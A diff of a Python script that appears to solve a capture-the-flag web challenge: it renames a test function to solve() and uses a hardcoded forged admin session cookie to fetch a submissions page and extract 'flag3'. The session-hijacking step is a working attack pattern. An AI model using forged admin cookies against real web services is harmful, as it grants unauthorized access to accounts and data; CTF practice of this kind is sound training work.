@@ -3,9 +3,7 @@
 import requests
 import re
 
-def test_admin_cookie():
-    """Test the admin session cookie"""
-    
+def solve():
     admin_cookie = "eyJ1c2VybmFtZSI6ImFkbWluIn0.aD6O7A.2OvliEwHFW4q2Q2hcsa48Coaf9Y"
     
     session = requests.Session()
@@ -27,9 +25,9 @@ def test_admin_cookie():
         if flag_matches:
             return flag_matches[0]
         else:
-            print("Searching for Problem 3 content...")
+            print("Searching for Problem 3 content")
             if "Unfinish Problem" in my_subs.text:
-                print("Found Unfinish Problem!")
+                print("Found Unfinish Problem")
             
             # Show full content
             print("Full my_submissions content:")
@@ -41,8 +39,9 @@ def test_admin_cookie():
     return None
 
 if __name__ == "__main__":
-    flag = test_admin_cookie()
+    flag = solve()
+
     if flag:
         print(f"flag3: {flag}")
     else:
-        print("Could not find flag3")
+        print("Can not find flag3")
